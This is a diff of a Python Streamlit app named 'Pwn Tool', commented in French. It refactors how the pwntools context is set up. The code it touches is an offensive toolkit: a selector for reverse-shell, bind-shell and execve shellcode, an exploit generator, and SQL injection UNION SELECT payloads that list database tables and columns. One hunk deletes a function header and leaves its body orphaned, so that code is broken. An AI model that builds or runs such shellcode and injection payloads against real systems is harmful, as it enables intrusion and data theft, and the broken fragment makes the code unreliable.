@@ -1,14 +1,4 @@
-import streamlit as st
-
-# Must be the first Streamlit command
-st.set_page_config(
-    page_title="Pwn Tool",
-    page_icon="🔥",
-    layout="wide", 
-    initial_sidebar_state="expanded"
-)
-
-# Import modules before any other Streamlit commands
+# Import non-Streamlit modules first
 import sys
 import os
 from datetime import datetime
@@ -20,17 +10,28 @@ from concurrent.futures import ThreadPoolExecutor
 from googletrans import Translator
 import streamlit.runtime.scriptrunner.script_runner as script_runner
 
+# Then import streamlit
+import streamlit as st
+
+# Must be the first Streamlit command - nothing Streamlit-related before this!
+st.set_page_config(
+    page_title="Pwn Tool",
+    page_icon="🔥",
+    layout="wide", 
+    initial_sidebar_state="expanded"
+)
+
 # Initialize pwntools context
 PWNTOOLS_ERROR = None
 try:
     from pwn import *
-    from pwnlib.context import context as pwncontext
-    CONTEXT = pwncontext
-    CONTEXT.arch = 'amd64'
-    CONTEXT.os = 'linux'
-    CONTEXT.log_level = 'debug'
+    # Définir une variable globale pour le contexte
+    PWNCTX = context
+    PWNCTX.arch = 'amd64'
+    PWNCTX.os = 'linux'
+    PWNCTX.log_level = 'debug'
 except Exception as e:
-    CONTEXT = None
+    PWNCTX = None
     PWNTOOLS_ERROR = str(e)
 
 def show_pwntools_error():
@@ -42,10 +43,10 @@ def show_pwntools_error():
 def init_context(arch='amd64', os='linux', log_level='debug'):
     """Initialise le contexte pwntools de manière sécurisée"""
     try:
-        if CONTEXT:
-            CONTEXT.arch = arch
-            CONTEXT.os = os
-            CONTEXT.log_level = log_level
+        if PWNCTX:
+            PWNCTX.arch = arch
+            PWNCTX.os = os
+            PWNCTX.log_level = log_level
             return True
         return False
     except Exception as e:
@@ -481,10 +482,11 @@ with st.expander(texts[current_lang]["advanced"]):
             ['amd64', 'i386', 'arm', 'aarch64'],
         )
         # Mise à jour du contexte après la sélection
-        try:
-            context.arch = selected_arch
-        except Exception as e:
-            st.error(f"❌ Erreur lors du changement d'architecture: {str(e)}")
+        if PWNCTX:
+            try:
+                PWNCTX.arch = selected_arch
+            except Exception as e:
+                st.error(f"❌ Erreur lors du changement d'architecture: {str(e)}")
         shellcode_type = st.selectbox(
             texts[current_lang]["shellcode"],
             ['shell_bind_tcp', 'shell_reverse_tcp', 'execve']
@@ -578,7 +580,6 @@ def extract_info(url):
     # Tables
     tables_payload = "' UNION SELECT GROUP_CONCAT(table_schema,'.',table_name),NULL FROM information_schema.tables WHERE table_schema=database()-- -"
     # Colonnes (utiliser des requêtes préparées en production)
-    def get_columns(table):
         return f"' UNION SELECT GROUP_CONCAT(column_name),NULL FROM information_schema.columns WHERE table_name='{table}'-- -"
     return tables_payload, get_columns
 # 4. Protection contre les injections
@@ -642,9 +643,12 @@ def validate_input(target, port, shellcode_type):
 def generate_exploit(shellcode_type, target, custom_port, selected_arch):
     """Génère un exploit selon les paramètres choisis"""
     try:
+        if not PWNCTX:
+            raise Exception("pwntools n'est pas initialisé")
+            
         # Configuration du contexte
-        if not init_context(arch=selected_arch):
-            raise Exception("Erreur d'initialisation du contexte")
+        PWNCTX.arch = selected_arch
+        PWNCTX.os = 'linux'
             
         # Génération du shellcode
         if shellcode_type == 'shell_reverse_tcp':
@@ -714,11 +718,11 @@ if st.button(texts[current_lang]["generate"]):
             st.error(f"❌ Erreur de génération: {str(e)}")
 
 # Affichage des informations de débogage
-if CONTEXT and CONTEXT.log_level == 'debug':
+if PWNCTX and PWNCTX.log_level == 'debug':
     with st.expander("🔍 Informations de Débogage"):
         st.code(f"""
-Architecture: {CONTEXT.arch}
-OS: {CONTEXT.os}
+Architecture: {PWNCTX.arch}
+OS: {PWNCTX.os}
 """, language="text")
 
 # Conseils et avertissements
